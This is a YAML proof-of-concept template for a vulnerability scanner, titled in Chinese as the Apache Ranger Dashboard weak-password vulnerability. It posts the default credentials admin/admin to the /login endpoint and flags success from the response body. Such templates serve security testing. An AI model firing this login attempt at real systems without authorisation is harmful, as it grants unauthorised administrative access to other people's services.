id: poc-yaml-apache-ranger-weak-pass
info:
  name: Apache Ranger Dashboard 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: Apache Ranger
  osprey-id: vb_2022_0100
variables:
  r_username: admin
  r_password: admin
requests:
- method: POST
  path: /login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username={{.r_username}}&password={{.r_password}}
  expression: '(contains(body, "\"statusCode\":200") || contains(body, "\"msgDesc\":\"Login
    Successful\""))

    '
transport: http
